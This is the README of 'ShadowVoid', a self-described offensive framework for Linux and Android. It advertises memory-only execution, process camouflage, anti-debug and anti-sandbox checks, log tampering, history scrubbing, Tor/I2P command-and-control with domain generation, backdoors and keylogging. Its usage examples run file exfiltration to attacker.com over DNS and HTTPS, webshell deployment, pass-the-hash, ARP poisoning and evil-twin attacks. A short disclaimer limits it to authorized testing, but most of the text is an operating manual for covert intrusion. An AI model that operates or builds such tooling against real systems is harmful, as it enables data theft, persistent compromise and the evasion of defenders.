# ShadowVoid Framework

**Complete Memory-Resident Polymorphic Offensive Security Orchestrator** for Linux/Termux/Android.

[![Python 3.x](https://img.shields.io/badge/python-3.x-blue.svg)]
[![License](https://img.shields.io/badge/license-GPLv3-red.svg)]
[![Status](https://img.shields.io/badge/status-Alpha-orange.svg)]

---

## [32m[1m[4m✨ Features[0m

### [34m[1mCore Capabilities[0m
- [32m✓[0m Process camouflage (svchost, cron, kworker, systemd)
- [32m✓[0m **Memory-only execution** - Zero disk footprint
- [32m✓[0m Timestomping (sync timestamps with system files)
- [32m✓[0m Polymorphic code (self-modifying Python)
- [32m✓[0m Anti-debug (GDB, strace, lldb detection)
- [32m✓[0m Anti-sandbox (VM, container, debugger detection)
- [32m✓[0m **Persistent C2 with Tor/I2P fallback**
- [32m✓[0m DGA (Domain Generation Algorithm) for C2 infrastructure
- [32m✓[0m Dead drop resolvers (Twitter, Pastebin, GitHub, Discord)
- [32m✓[0m Heartbeat system with kill-switch

### [35m[1mOffensive Modules[0m
1. **recon** - Dark web OSINT, ARP/NetBIOS scanning, Cloud mapping
2. **exploit** - 0-day integration, CVE auto-exploiters, Multi-stage chains
3. **auth** - Hashcat integration, Pass-the-hash, Kerberos (Golden/Silver Ticket)
4. **wireless** - Evil twin, Karma attacks, BLE exploitation
5. **net** - ARP poisoning, DNS spoofing, VPN penetration
6. **web** - Webshells, CMS scanners, SSRF/XXE automation
7. **onion** - .onion enumeration, Hidden service mapping
8. **post_exploit** - Persistence, Lateral movement, **Encrypted Data Exfiltration**, Backdoor installation

### [36m[1mNew in v1.0.0-alpha (Memory-Resident Update)[0m
- [32m✓[0m **True Memory-Resident Execution** - All modules cached in RAM
- [32m✓[0m **Persistent C2 Connection** - Automatic Tor/I2P fallback routing
- [32m✓[0m **Encrypted Exfiltration** - AES256-GCM on all channels
- [32m✓[0m **Memory-Only Loader** - Direct execution without disk writes

---

## [32m[1m🚀 Quick Start[0m

### Installation

```bash
# Clone the repository
git clone https://github.com/mraaisa-afk/shadow-void.git
cd shadow-void

# Install dependencies
pip3 install -r requirements.txt

# Run the framework
python3 shadowvoid.py
```

### Docker (Optional)

```bash
# Build and run in container
docker build -t shadowvoid .
docker run -it --rm shadowvoid
```

---

## [34m[1m📖 Usage Guide[0m

### Interactive Mode

```bash
python3 shadowvoid.py
# Type 'help' for commands, 'exit' to quit
sv> help
```

### Command-Line Mode

```bash
# Initialize stealth environment
python3 shadowvoid.py init

# Run reconnaissance
python3 shadowvoid.py scan example.com full

# Execute exploit
python3 shadowvoid.py exploit CVE-2024-1234 192.168.1.100

# Lateral movement
python3 shadowvoid.py pivot 192.168.1.100 psexec

# Data exfiltration
python3 shadowvoid.py exfil /tmp/data.txt attacker.com dns

# Clean up
python3 shadowvoid.py clean
```

### Quick Access Codes

```bash
sv> !scan     # Run full scan
sv> !exploit  # Execute exploit
sv> !pivot    # Lateral movement
sv> !exfil    # Data exfiltration
sv> !clean    # Scrub artifacts
```

---

## [35m[1m🔧 Memory-Resident Execution[0m

### How It Works

ShadowVoid now **runs entirely in memory** with zero disk footprint:

1. **Module Caching**: All module source code is cached in `MODULE_SOURCE_CACHE` at startup
2. **Memory Loader**: Custom `MemoryModuleLoader` in `sys.meta_path` serves modules from RAM
3. **No Disk I/O**: Modules never written to or read from disk during execution

### Usage

```python
from core import ShadowVoidCore, MODULE_SOURCE_CACHE

# Initialize framework - all modules cached in RAM
core = ShadowVoidCore()

# Check cached modules
print(list(MODULE_SOURCE_CACHE.keys()))
# Output: ['recon', 'exploit', 'auth', 'wireless', 'net', 'web', 'onion', 'post_exploit']
```

### Loader Memory Mode

The loader (`loader.py`) now defaults to **memory-only execution**:

```python
# Memory-only is enabled by default
CONFIG = {
    'memory_only': True,  # Execute payloads directly from memory
    # ...
}

# Payload is decrypted and executed entirely in RAM
# Falls back to temp file only if memory execution fails
```

---

## [36m[1m🌐 Persistent C2 Connection[0m

### Features

- **Automatic Tor/I2P Detection**: Checks for running services at startup
- **Persistent Connection**: Background thread with auto-reconnection
- **Automatic Fallback**: Switches between Tor and I2P based on availability
- **Encrypted Communication**: All traffic encrypted via AES256-GCM

### Usage

```python
from core import ShadowVoidCore

core = ShadowVoidCore()

# Check C2 status
print(core.c2_connection.connected)  # True if connected
print(core.c2_connection.routers)     # [('tor', <TorRouter>), ('i2p', <I2PRouter>)]

# Make encrypted request through C2
response = core.c2_connection.make_request(
    'https://c2-server.onion/api',
    'POST',
    {'data': 'payload'},
    {'Content-Type': 'application/json'},
    encrypt=True  # Enable encryption
)
```

### Configuration

```yaml
# config.yaml
c2:
  enabled: true
  routing:
    tor: true      # Use Tor network
    i2p: true      # Use I2P network
    socks5: '127.0.0.1:9050'  # Tor proxy
  dga:
    enabled: true
    domains_per_day: 1000
    tlds: ['com', 'net', 'org', 'io', 'xyz']
  heartbeat:
    interval: 300   # 5 minutes
    jitter: 60      # Random variation
    kill_switch: 7200  # 2 hours
```

---

## [33m[1m🔒 Encrypted Exfiltration[0m

### Supported Channels

| Channel | Encrypted | C2 Routing | Description |
|---------|-----------|------------|-------------|
| DNS | [32m✓[0m | [32m✓[0m | Domain-based data exfiltration |
| ICMP | [32m✓[0m | [32m✓[0m | Ping-based data exfiltration |
| HTTP | [32m✓[0m | [32m✓[0m | Standard HTTP POST |
| HTTPS | [32m✓[0m | [32m✓[0m | Encrypted HTTPS POST |

### Usage

```python
from modules.post_exploit import PostExploitModule

# Initialize with core
post = PostExploitModule(core)

# Exfiltrate via DNS with encryption
result = post.exfiltrate(
    source='/tmp/secrets.txt',
    destination='attacker.com',
    channel='dns',
    use_c2=True  # Route through C2 connection
)

# Exfiltrate via HTTPS with encryption
result = post.exfiltrate(
    source='/tmp/data.bin',
    destination='attacker.com:443',
    channel='https'
)
```

### Encryption

All exfiltration automatically uses **AES256-GCM encryption** when:
- `CONFIG['exfiltration']['encryption']` is `True` (default)
- Framework cipher is available (`core.cipher`)

```python
# Manual encryption
data = b"secret data"
encrypted = core.cipher.encrypt(data)
decrypted = core.cipher.decrypt(encrypted)
```

---

## [31m[1m🛡️ Stealth Features[0m

### Process Camouflage

```bash
# Process appears as 'svchost' in ps/top/htop
ps aux | grep svchost
```

### Anti-Detection

- **Anti-Debug**: Detects GDB, strace, lldb
- **Anti-Sandbox**: Detects VMWare, VirtualBox, Docker, LXC
- **History Scrubbing**: Clears `.bash_history`, `.zsh_history`, `.python_history`
- **Log Tampering**: Removes framework traces from system logs
- **Timestomping**: Syncs file timestamps with system files

### Usage

```python
from core import (
    camouflage_process,
    anti_debug_check,
    anti_sandbox_check,
    scrub_history,
    timestomping
)

# Enable stealth
camouflage_process('svchost')
anti_debug_check()
anti_sandbox_check()
scrub_history()
timestomping(__file__)
```

---

## [34m[1m📊 Module Reference[0m

### recon

**Dark web OSINT, ARP/NetBIOS scanning, Cloud mapping**

```bash
# Full reconnaissance
sv> scan example.com full

# Onion service scan
sv> scan example.onion onion

# ARP scan
sv> scan 192.168.1.0/24 arp

# Cloud mapping
sv> scan example.com cloud
```

### exploit

**0-day integration, CVE auto-exploiters, Multi-stage chains**

```bash
# Execute specific CVE
sv> exploit CVE-2024-1234 192.168.1.100

# Auto-exploit target
sv> exploit auto 192.168.1.100

# Profile target
sv> exploit profile 192.168.1.100
```

### auth

**Hashcat integration, Pass-the-hash, Kerberos**

```bash
# Brute force hash
sv> modules list  # Check auth module

# Use via Python API
from modules.auth import AuthModule
auth = AuthModule(core)
auth.brute_force('hash_value', 'md5')
auth.pass_the_hash('ntlm_hash', '192.168.1.100')
auth.golden_ticket('domain', 'sid', 'user', 'ntlm_hash')
```

### wireless

**Evil twin, Karma attacks, BLE exploitation**

```python
from modules.wireless import WirelessModule
wireless = WirelessModule(core)
wireless.evil_twin('wlan0', 'FreeWiFi', channel=6)
wireless.karma_attack('wlan0')
wireless.ble_scan('hci0', duration=10)
```

### net

**ARP poisoning, DNS spoofing, VPN penetration**

```python
from modules.net import NetModule
net = NetModule(core)
net.arp_poison('eth0', '192.168.1.100', '192.168.1.1')
net.dns_spoof('eth0', 'example.com', '192.168.1.100')
net.vpn_penetrate('vpn.example.com', '10.0.0.1')
```

### web

**Webshells, CMS scanners, SSRF/XXE automation**

```python
from modules.web import WebModule
web = WebModule(core)
web.deploy_webshell('example.com', '/shell.php', 'php')
web.ssrf_test('example.com', 'http://internal-server')
web.xxe_test('example.com', '/api/parse')
web.cms_scan('example.com')
```

### onion

**.onion enumeration, Hidden service mapping**

```python
from modules.onion import OnionModule
onion = OnionModule(core)
onion.enumerate_services()
onion.map_hidden_services()
onion.scan_onion_service('example.onion')
```

### post_exploit

**Persistence, Lateral movement, Data exfiltration, Backdoor installation**

```python
from modules.post_exploit import PostExploitModule
post = PostExploitModule(core)

# Install persistence
post.install_persistence('192.168.1.100', method='cron')

# Lateral movement
post.lateral_movement('current', '192.168.1.101', method='psexec')

# Data exfiltration
post.exfiltrate('/tmp/data.txt', 'attacker.com', channel='dns', use_c2=True)

# Install backdoor
post.install_backdoor('192.168.1.100', backdoor_type='python')

# Start keylogger
post.keylogging_start('192.168.1.100')
```

---

## [32m[1m🔍 C2 Commands[0m

```bash
# Check C2 status
sv> c2 status

# Generate DGA domains
sv> c2 generate 10

# List modules
sv> modules list
```

---

## [31m[1m⚠️ Legal Disclaimer[0m

**This framework is for educational and authorized security testing purposes only.**

- [31m❌[0m Do NOT use against systems you do not own or have explicit permission to test
- [31m❌[0m Do NOT use for illegal activities
- [31m❌[0m Do NOT use in production environments without authorization

**Use responsibly. The authors are not responsible for misuse.**

---

## [34m[1m📜 License[0m

GPLv3 - See [LICENSE](LICENSE) for details.

---

## [36m[1m📞 Support[0m

- **Issues**: https://github.com/mraaisa-afk/shadow-void/issues
- **Discussions**: https://github.com/mraaisa-afk/shadow-void/discussions
- **Contributing**: Pull requests welcome!

---

*ShadowVoid - Stay in the shadows.*
